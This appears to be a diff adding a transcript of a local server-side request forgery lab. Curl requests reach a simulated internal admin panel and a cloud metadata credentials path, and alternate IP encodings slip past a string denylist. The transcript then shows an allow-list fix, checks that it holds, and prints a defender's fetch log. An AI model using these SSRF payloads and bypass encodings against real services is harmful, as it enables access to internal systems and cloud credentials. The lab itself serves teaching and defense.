@@ -1,0 +1,48 @@
+=== b-ssrf walkthrough transcript ===
+date: 2026-10-09  python: Python 3.12.3  curl: curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.10
+env: loopback only, no Docker on this machine (labeled local demo)
+note: the 'metadata' tree is a labeled simulation on loopback; no real cloud endpoints touched
+
+--- step 1: start both servers + baseline ---
+ssrf demo public=127.0.0.1:8325 internal=127.0.0.1:8326 FIXED=False
+$ curl -d 'stockApi=http://127.0.0.1:8325/products/1/stock' localhost:8325/product/stock
+{"product":1,"stock":14}
+
+--- step 2: SSRF against loopback admin ---
+$ curl -d 'stockApi=http://127.0.0.1:8326/admin' localhost:8325/product/stock
+INTERNAL ADMIN PANEL -- loopback only, no auth required
+
+--- step 3: SSRF against metadata simulation (role name only) ---
+$ curl -d 'stockApi=http://127.0.0.1:8326/latest/meta-data/iam/security-credentials/' ...
+demo-app-role
+
+--- step 4: why string denylists fail (validator layer) ---
+A naive denylist checks the STRING; the network stack resolves the NAME.
+denylist says: ALLOW  network stack resolves 2130706433         -> 127.0.0.1   url=http://2130706433:8326/admin
+denylist says: ALLOW  network stack resolves 127.1              -> 127.0.0.1   url=http://127.1:8326/admin
+denylist says: ALLOW  network stack resolves 0x7f.0.0.1         -> 127.0.0.1   url=http://0x7f.0.0.1:8326/admin
+(Python's urllib normalizes some of these forms, so the demo fetches
+ the canonical 127.0.0.1; curl, Java, and browsers follow the alternates
+ to loopback. The bypass class lives in the VALIDATOR, not the fetcher.)
+
+--- step 5: apply fix (allow-list + canonicalized validation + no redirects) ---
+ssrf demo public=127.0.0.1:8325 internal=127.0.0.1:8326 FIXED=True
+--- step 6: verify fix, four cases ---
+[loopback admin]:
+fetch refused: resolved IP 127.0.0.1 in deny range
+[decimal-octet bypass]:
+fetch refused: resolved IP 127.0.0.1 in deny range
+[metadata]:
+fetch refused: resolved IP 127.0.0.1 in deny range
+[legitimate, via allow-list id]:
+{"product":1,"stock":14}
+
+--- step 7: defender view (fetch log, vulnerable run) ---
+FETCH-REQUEST stockApi=http://127.0.0.1:8325/products/1/stock
+FETCHED http://127.0.0.1:8325/products/1/stock (24 bytes)
+FETCH-REQUEST stockApi=http://127.0.0.1:8326/admin
+FETCHED http://127.0.0.1:8326/admin (55 bytes)
+FETCH-REQUEST stockApi=http://127.0.0.1:8326/latest/meta-data/iam/security-credentials/
+FETCHED http://127.0.0.1:8326/latest/meta-data/iam/security-credentials/ (13 bytes)
+
+=== end transcript ===
